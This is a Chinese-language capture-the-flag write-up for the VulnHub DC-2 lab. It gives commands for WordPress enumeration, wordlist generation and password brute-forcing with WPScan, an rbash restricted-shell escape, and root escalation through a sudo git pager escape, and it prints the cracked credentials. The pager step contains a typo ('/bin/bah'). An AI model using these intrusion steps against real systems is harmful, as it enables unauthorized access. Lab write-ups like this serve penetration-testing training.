vulnhub-DC-2

首先通过Nmap探测到靶机IP地址为 192.168.93.6，然后使用Nmap进行全端口扫描

目标主机开放80和7744端口

这里访问需要配置 hosts

# Linux环境 /etc/hosts
# Windows环境 C:\Windows\System32\drivers\etc\hosts
192.168.93.6    dc-2

指纹识别

识别出来是 wordpress 4.7.10 搭建的站点

使用 WPScan 进行扫描

wpscan --url http://dc-2 -e u,vt,tt,vp

同样识别出来是 wordpress 4.7.10 版本，枚举出来三个用户：admin、jerry、tom

在站点 flag 页面发现 flag1

根据提示可以使用 cewl 工具爬取网站内容关键字生成一份密码字典来爆破后台

cewl http://dc-2 -m 3 -d 3 -e -w password.txt

执行上述命令会生成 password.txt 这个密码字典文件，再将上面枚举出来的三个用户名组成用户名字典 username.txt

使用WPScan爆破密码

wpscan --url http://dc-2 -U username.txt -P password.txt

成功爆破出两个用户密码

Username: jerry, Password: adipiscing
Username: tom, Password: parturient

使用账号 jerry 密码 adipiscing 登录管理后台 http://dc-2/wp-admin/

在管理后台发现 flag2

登录的是一个低权限的账号，无法获取shell，根据提示找另一个切入点，切合前面扫描出来的 7744 端口开放 ssh 服务，使用现有账号密码尝试 ssh 登录

使用账号 tom，密码 parturient 可以成功登录

ssh tom@192.168.93.6 -p 7744

登录进去发现是受限shell环境 rbash，限制了某些命令的执行

依次执行如下3条命令来绕过限制

BASH_CMDS[a]=/bin/sh;a
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin

查看 flag3.txt 文件获取到 flag3

根据提示切换到 jerry 用户

su jerry
# password: adipiscing

在用户家目录发现 flag4.txt 文件，查看获取flag4

执行 sudo -l 命令，发现可列出当前用户可执行的命令，表示当前用户有sudo访问权限

git命令可以以root权限执行，且不需要密码

执行 sudo git help config 命令，要输出的信息过多会分页显示内容，此时输入 !/bin/bah 回车后，会获取到root权限的shell

使用 find 命令模糊搜索所有 txt 文件，最终在 root 目录下发现最后的flag文件
